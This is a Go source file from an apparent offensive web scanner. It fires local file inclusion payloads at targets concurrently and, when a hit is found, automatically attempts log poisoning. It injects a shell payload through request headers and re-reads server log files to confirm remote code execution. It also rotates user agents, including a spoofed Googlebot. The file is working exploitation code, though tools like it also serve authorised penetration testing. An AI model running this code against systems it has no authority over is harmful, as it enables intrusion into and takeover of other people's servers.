package scanner

import (
	"crypto/tls"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"strings"
	"sync"
	"time"

	"github.com/Serdar715/lfix/pkg/engine"
)

const (
	// maxResponseBodySize limits memory usage per response to avoid OOM with large payloads.
	maxResponseBodySize = 10 * 1024 * 1024 // 10 MB
	// maxWorkers limits concurrent workers to prevent DoS on the scanning machine.
	maxWorkers = 100
)

// Statistics tracks scan progress
type Statistics struct {
	mu            sync.RWMutex
	TotalTargets  int
	TotalPayloads int
	RequestsSent  int
	Findings      int
	Errors        int
	StartTime     time.Time
}

// NewStatistics creates a new statistics tracker
func NewStatistics() *Statistics {
	return &Statistics{
		StartTime: time.Now(),
	}
}

// IncrementRequests increments the request counter
func (st *Statistics) IncrementRequests() {
	st.mu.Lock()
	defer st.mu.Unlock()
	st.RequestsSent++
}

// IncrementFindings increments the findings counter
func (st *Statistics) IncrementFindings() {
	st.mu.Lock()
	defer st.mu.Unlock()
	st.Findings++
}

// IncrementErrors increments the error counter
func (st *Statistics) IncrementErrors() {
	st.mu.Lock()
	defer st.mu.Unlock()
	st.Errors++
}

// SetTargets sets the target and payload counts
func (st *Statistics) SetTargets(targets, payloads int) {
	st.mu.Lock()
	defer st.mu.Unlock()
	st.TotalTargets = targets
	st.TotalPayloads = payloads
}

// Get returns current statistics
func (st *Statistics) Get() (targets, payloads, requests, findings, errors int, elapsed time.Duration) {
	st.mu.RLock()
	defer st.mu.RUnlock()
	return st.TotalTargets, st.TotalPayloads, st.RequestsSent, st.Findings, st.Errors, time.Since(st.StartTime)
}

// Options holds the configuration for the scanner.
type Options struct {
	Concurrency           int
	Timeout               int
	Proxy                 string
	UseMutation           bool
	Calibrate             bool
	Debug                 bool
	TLSInsecureSkipVerify bool
	// Log Poisoning & RCE
	EnableLogPoison bool
	EnableRCE       bool
	ShellPayload    string
}

// Scanner is the main struct that orchestrates the scanning process.
type Scanner struct {
	client        *http.Client
	Options       Options
	baselineCache sync.Map
	userAgents    []string
	uaIndex       int
	uaMu          sync.Mutex
	stats         *Statistics
	Progress      chan int // Progress signal channel
}

// NewScanner creates a new scanner instance with the given options.
func NewScanner(opts Options) *Scanner {
	// Enforce maximum worker limit to prevent DoS on scanning machine.
	if opts.Concurrency <= 0 {
		opts.Concurrency = 30
	} else if opts.Concurrency > maxWorkers {
		opts.Concurrency = maxWorkers
	}

	transport := &http.Transport{
		TLSClientConfig:     &tls.Config{InsecureSkipVerify: opts.TLSInsecureSkipVerify},
		MaxIdleConnsPerHost: opts.Concurrency,
	}
	if opts.Proxy != "" {
		proxyURL, err := url.Parse(opts.Proxy)
		if err == nil {
			transport.Proxy = http.ProxyURL(proxyURL)
		}
	}

	client := &http.Client{
		Transport: transport,
		Timeout:   time.Duration(opts.Timeout) * time.Second,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse // Do not follow redirects
		},
	}

	return &Scanner{
		client:  client,
		Options: opts,
		userAgents: []string{
			"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
			"Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
			"Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0",
			"curl/7.88.1",
			"wget/1.21.3",
		},
		uaMu:     sync.Mutex{},
		stats:    NewStatistics(),
		Progress: make(chan int, opts.Concurrency*2),
	}
}

// Start initiates the scanning process.
func (s *Scanner) Start(targets []string, payloads []string, postData, method, targetHeader string, staticHeaders map[string]string) <-chan engine.Finding {
	tasks := make(chan engine.Task, s.Options.Concurrency*2)
	findings := make(chan engine.Finding)
	var wg sync.WaitGroup

	// Set statistics
	s.stats.SetTargets(len(targets), len(payloads))

	// Start workers
	for i := 0; i < s.Options.Concurrency; i++ {
		wg.Add(1)
		go s.worker(tasks, findings, &wg)
	}

	// Dispatcher goroutine: generates tasks and sends them to the workers.
	go func() {
		for _, target := range targets {
			engine.GenerateTasks(target, payloads, postData, method, targetHeader, staticHeaders, s.Options.UseMutation, tasks)
		}
		close(tasks)
	}()

	// Closer goroutine: waits for all workers to finish, then closes the findings channel.
	go func() {
		wg.Wait()
		close(findings)
	}()

	return findings
}

func (s *Scanner) worker(tasks <-chan engine.Task, findings chan<- engine.Finding, wg *sync.WaitGroup) {
	defer wg.Done()
	for task := range tasks {
		s.stats.IncrementRequests()

		// Send progress signal
		select {
		case s.Progress <- 1:
		default:
			// If channel is full, skip to avoid blocking worker
		}

		var baselineBody string
		if s.Options.Calibrate {
			baselineBody = s.getBaseline(task)
		}

		// doRequest encapsulates the HTTP round-trip so defer is scoped correctly.
		body, err := s.doRequest(task.Method, task.URL, task.PostData, task.Headers)
		if err != nil {
			s.stats.IncrementErrors()
			if s.Options.Debug {
				fmt.Printf("[DEBUG] request failed: %v\n", err)
			}
			continue
		}

		if finding := engine.AnalyzeResponse(body, baselineBody, task); finding != nil {
			s.stats.IncrementFindings()
			findings <- *finding

			// Eğer Log Poisoning aktifse, zafiyet sonrası işlemi başlat
			if s.Options.EnableLogPoison {
				s.attemptPoisoning(*finding, findings)
			}
		}
	}
}

// attemptPoisoning tries to achieve RCE via log poisoning after an LFI is found.
func (s *Scanner) attemptPoisoning(finding engine.Finding, findings chan<- engine.Finding) {
	if s.Options.Debug {
		fmt.Printf("[DEBUG] Attempting log poisoning for: %s\n", finding.Task.URL)
	}

	for _, logPath := range engine.CommonLogPaths {
		pTask := engine.PoisonTask(finding.Task, logPath, s.Options.ShellPayload)

		// 1. Zehirleme isteğini gönder (User-Agent'a shell ekler)
		_, err := s.doRequest(pTask.Method, pTask.URL, pTask.PostData, pTask.Headers)
		if err != nil {
			continue
		}

		// 2. Zehirlemenin başarılı olup olmadığını kontrol et
		// Kaynak kodda shell payload'un çalışıp çalışmadığını test etmek için
		// log dosyasını tekrar okuyup analiz ediyoruz.
		checkBody, err := s.doRequest(pTask.Method, pTask.URL, pTask.PostData, nil)
		if err != nil {
			continue
		}

		if engine.CheckPoisonSuccess(checkBody, s.Options.ShellPayload) {
			s.stats.IncrementFindings()
			findings <- engine.Finding{
				Task:      pTask,
				MatchInfo: "RECOGNIZED: Log Poisoning Success (RCE)",
			}
			// Bir tane başarılı poisoning yeterli
			return
		}
	}
}

// doRequest performs a single HTTP request and returns the response body as a string.
// Body is always closed before returning — safe to call in a loop.
func (s *Scanner) doRequest(method, targetURL, postData string, headers map[string]string) (string, error) {
	req, err := http.NewRequest(method, targetURL, strings.NewReader(postData))
	if err != nil {
		return "", fmt.Errorf("building request: %w", err)
	}

	// Get next user agent (thread-safe)
	req.Header.Set("User-Agent", s.getNextUserAgent())

	// Set Content-Type for POST requests with form data (not JSON).
	if method == "POST" && postData != "" && !strings.HasPrefix(strings.TrimSpace(postData), "{") {
		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	}
	for k, v := range headers {
		req.Header.Set(k, v)
	}

	resp, err := s.client.Do(req)
	if err != nil {
		return "", fmt.Errorf("executing request: %w", err)
	}
	defer resp.Body.Close()

	// Limit body read to maxResponseBodySize to prevent OOM on large responses.
	limited := io.LimitReader(resp.Body, maxResponseBodySize)
	bodyBytes, err := io.ReadAll(limited)
	if err != nil {
		return "", fmt.Errorf("reading body: %w", err)
	}

	return string(bodyBytes), nil
}

// getNextUserAgent returns the next user agent in rotation (thread-safe)
func (s *Scanner) getNextUserAgent() string {
	s.uaMu.Lock()
	defer s.uaMu.Unlock()

	ua := s.userAgents[s.uaIndex]
	s.uaIndex = (s.uaIndex + 1) % len(s.userAgents)
	return ua
}

// GetStatistics returns current scan statistics
func (s *Scanner) GetStatistics() (int, int, int, int, int, time.Duration) {
	return s.stats.Get()
}

// getBaseline fetches the original response body for a URL to use in calibration.
func (s *Scanner) getBaseline(task engine.Task) string {
	// Strip FUZZ keyword from URL for a clean baseline request.
	cleanURL := strings.ReplaceAll(task.OriginalURL, "FUZZ", "")
	baseKey := cleanURL

	if cached, ok := s.baselineCache.Load(baseKey); ok {
		return cached.(string)
	}

	body, err := s.doRequest(task.Method, cleanURL, "", task.Headers)
	if err != nil {
		// Cache empty string so we don't retry on every task for this URL.
		s.baselineCache.Store(baseKey, "")
		return ""
	}

	s.baselineCache.Store(baseKey, body)
	return body
}
